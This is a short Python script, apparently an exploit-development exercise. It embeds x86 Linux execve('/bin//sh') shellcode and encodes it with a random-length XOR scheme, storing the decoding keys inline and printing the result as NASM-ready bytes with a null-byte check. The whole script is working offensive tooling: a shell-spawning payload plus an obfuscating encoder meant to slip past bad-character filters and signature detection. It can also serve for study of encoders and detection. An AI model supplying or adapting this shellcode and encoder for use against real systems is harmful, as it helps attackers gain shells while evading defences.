#!/usr/bin/python3
import random

#execve-stsack shellcode
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
#costum ending
shellcode += b"\x90\x90\xaa\xbb"

newShellcode = bytearray()
shellcodePos = 0

#loop until whole shellcode is encoded
while shellcodePos < len(shellcode):
    # when less then 6 bytes are left then --> random Value = difference 
    if len(shellcode)- shellcodePos < 6:
        randomValue = len(shellcode) - shellcodePos
    #otherwise set a random value between from 2 to 6
    else:
        randomValue = random.randint(2,6)
    #for later decryption the random value is needed so save 0xff - value to the shellcode
    newShellcode.append(0xff-randomValue)
    #encrypt/XOR with this value the next bytes (amount of bytes to XOR = random value)
    for i in range(0, randomValue):
        newShellcode.append(bytearray(shellcode)[shellcodePos] ^ randomValue)
        #indexer for the old shellcode
        shellcodePos +=1

shellstring = ""
#format the encoded bytearray to the format for nasm
for i in newShellcode:
    shellstring+=hex(i) + ", "
if "00" in shellstring:
  print("There was a null byte found in the shellcode. Please change shellcode or rerun!")
print(shellstring)